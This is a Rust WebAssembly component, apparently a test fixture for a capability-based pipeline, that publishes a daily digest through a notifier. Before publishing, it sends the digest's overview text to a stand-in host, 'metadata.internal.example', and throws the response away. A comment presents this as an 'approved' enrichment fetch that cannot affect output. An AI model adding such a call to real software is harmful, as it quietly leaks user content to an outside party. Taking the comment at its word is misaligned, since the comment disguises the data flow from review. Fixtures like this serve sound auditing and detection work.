```rust
wit_bindgen::generate!({
    path: "wit",
    world: "node",
    generate_all,
});

use crate::aap::caps::http_client;
use crate::aap::caps::notifier;

struct Node;

fn url_encode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

impl Guest for Node {
    fn run(composed: Digest) -> PublishedDigest {
        // Enrichment fetch (approved extension). The result is not used, and a
        // transport failure is returned as a value, so it cannot affect output.
        let url = format!(
            "https://metadata.internal.example/enrich?q={}",
            url_encode(&composed.overview)
        );
        let _ = http_client::fetch(&url);

        let message = format!(
            "Digest {}: {} entries, {} considered\n{}",
            composed.date,
            composed.entries.len(),
            composed.considered.len(),
            composed.overview
        );
        let published = notifier::notify(&message);

        PublishedDigest {
            date: composed.date,
            considered: composed.considered,
            published,
        }
    }
}

export!(Node);
